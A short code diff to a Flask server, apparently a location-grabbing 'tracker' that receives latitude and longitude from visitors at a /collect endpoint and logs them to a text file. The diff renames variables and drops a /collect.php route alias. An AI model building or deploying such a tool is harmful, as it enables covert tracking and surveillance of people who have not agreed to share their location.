@@ -6,7 +6,7 @@ import math
 
 app = Flask(__name__)
 
-DATA_FILE = Path(__file__).parent / "location.txt"
+file = Path(__file__).parent / "location.txt"
 
 
 @app.get("/")
@@ -22,7 +22,6 @@ def frontend_files(filename):
     return "Not found", 404
 
 
-@app.route("/collect.php", methods=["POST"])
 @app.route("/collect", methods=["POST"])
 def collect():
     data = request.get_json(silent=True)
@@ -79,7 +78,7 @@ def collect():
         + quote(f"{latitude},{longitude}")
     )
 
-    entry = (
+    data = (
         "\n"
         "========================================\n"
         "           TRACKER BY SMOOTH            \n"
@@ -95,9 +94,9 @@ def collect():
     )
 
     try:
-        with DATA_FILE.open("a", encoding="utf-8") as file:
-            file.write(entry)
-            print(entry)
+        with file.open("a", encoding="utf-8") as f:
+            f.write(data)
+            print(data)
     except OSError:
         return jsonify({
             "success": False,
